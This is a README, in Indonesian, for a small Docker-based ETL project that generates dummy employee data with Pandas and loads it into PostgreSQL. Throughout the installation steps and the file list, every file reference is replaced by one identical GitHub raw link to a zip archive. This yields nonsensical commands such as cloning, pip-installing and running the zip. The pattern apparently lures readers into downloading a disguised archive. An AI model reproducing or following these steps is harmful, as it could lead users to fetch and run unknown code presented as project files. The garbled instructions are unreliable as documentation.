# docker-etl
# ETL dengan PostgreSQL, Pandas, dan Python

Proyek ETL (Extract, Transform, Load) menggunakan Python, Pandas, dan PostgreSQL. Ini mengekstrak data acak, mentransformasikannya, dan memuatnya ke dalam database PostgreSQL.

## Persyaratan

- Python 3.12
- PostgreSQL 15
- Pandas 2.2.2
- NumPy 1.26.4
- random
- sqlalchemy

## Instalasi

1. Klon repository ini:

    ```bash
    git clone https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip
    cd nama_repository_anda
    ```

2. Siapkan PostgreSQL:
    - Pastikan Anda telah menginstal Docker.
    - Atur variabel lingkungan PostgreSQL Anda di dalam `.env`.

3. Bangun dan jalankan kontainer Docker:

    ```bash
    docker-compose up -d
    ```

4. Instal dependensi Python:

    ```bash
    pip install -r https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip
    ```

## Penggunaan
1. buat table data_karyawan :
   ```bash
   CREATE TABLE IF NOT EXISTS data_karyawan (
        nama VARCHAR(255),
        usia INT,
        pekerjaan VARCHAR(255),
        asal_kota VARCHAR(255)
    )
   ```
2. Buat Data Dummy data_karyawan dengan menjalankan file : `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip`

4. Jalankan skrip Python:

    ```bash
    python https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip
    ```

## Deskripsi

- **Ekstrak**: Data acak dibuat menggunakan library `random` dan `numpy` Python dan disimpan dalam DataFrame Pandas.
- **Transformasi**: Data dalam DataFrame ditransformasi dengan menambahkan kolom untuk provinsi (`provinsi`) dan gaji (`gaji`).
- **Load**: Data yang telah ditransformasi dimuat ke dalam tabel database PostgreSQL yang bernama `data_karyawan_transform`.

## Struktur Berkas

- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip`: Berisi skrip Python untuk pipeline ETL.
- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip` : Berisi skrip python untuk membuat data dummy
- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip`: Daftar dependensi Python.
- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip`: Berkas Docker Compose untuk menyiapkan PostgreSQL.
- `Dockerfile`
- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip` : query untuk membuat table
- `.env` : mengatur variabel untuk postgres
- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip`: Berkas ini.
